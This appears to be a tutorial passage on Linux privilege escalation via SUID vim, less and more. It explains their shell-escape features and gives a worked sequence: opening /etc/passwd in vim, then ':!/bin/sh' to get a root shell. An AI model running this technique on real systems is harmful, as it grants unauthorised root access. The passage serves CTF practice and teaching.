Exploiting 'vim'

  • If vim is SUID, you can open any file.
  • From within vim, you can execute shell commands using :!command.
  • Spawning /bin/sh this way will inherit vim's root privileges.

Exploiting 'less' / 'more'

  • If less or more are SUID, you can view a file.
  • While viewing, type !command to execute a shell command.
  • Similar to vim, this will grant you a root shell.
Key Takeaway

SUID text editors and pagers like 'vim', 'less', and 'more' can be exploited by using their internal command execution features to spawn a root shell.

SUID 'vim' Exploitation
# Assume 'vim' is SUID root
# Open any file (e.g., /etc/passwd)
vim /etc/passwd

# Inside vim, type:
:!/bin/sh

# You are now in a root shell
whoami
# Expected output: root

# Exit the root shell
exit

# You are back in vim. Type :q! to quit vim.
Real-world Connection

This technique is often found in CTFs and real-world scenarios where system administrators might inadvertently leave SUID permissions on development tools or custom scripts.
